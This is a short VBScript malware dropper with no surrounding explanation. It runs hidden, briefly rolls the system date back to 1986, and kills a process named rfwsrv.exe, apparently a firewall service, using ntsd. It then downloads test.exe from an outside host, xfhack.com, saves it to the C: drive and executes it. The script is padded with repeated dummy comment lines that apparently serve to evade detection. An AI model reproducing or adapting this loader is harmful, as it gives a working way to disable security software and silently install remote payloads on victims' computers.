on error resume next
Set ws = CreateObject("Wscript.Shell") 
ws.run "cmd /c set date=%date% &&date 1986-1-1 &&ping -n 30 
127.0.0.1&&date %date%",vbhide
for each ps in getobject
("winmgmts:\\.\root\cimv2:win32_process").instances_
if ps.Name="rfwsrv.exe" then
ws.run "ntsd -c q -p ps.handle",0
end if:next
iLocal = LCase("c:\test.exe"):iRemote = LCase
("http://www.xfhack.com/test.exe")
'if 1=2 then Wscript.echo "Impossible!"
wscript.sleep 10000
'if 1=2 then Wscript.echo "Impossible!"
Set xPost = CreateObject("Microsoft.XMLHTTP")  
'if 1=2 then Wscript.echo "Impossible!"
xPost.Open "GET",iRemote,0 
'if 1=2 then Wscript.echo "Impossible!"
xPost.Send()  
'if 1=2 then Wscript.echo "Impossible!"
Set sGet = CreateObject("ADODB.Stream") 
'if 1=2 then Wscript.echo "Impossible!"
sGet.Mode = 3 
'if 1=2 then Wscript.echo "Impossible!"
sGet.Type = 1  
'if 1=2 then Wscript.echo "Impossible!"
sGet.Open()  
'if 1=2 then Wscript.echo "Impossible!"
sGet.Write(xPost.responseBody)  
'if 1=2 then Wscript.echo "Impossible!"
sGet.SaveToFile iLocal,2 
'if 1=2 then Wscript.echo "Impossible!"
Set Runner=CreateObject("Wscript.Shell")
'if 1=2 then Wscript.echo "Impossible!"
Runner.run iLocal
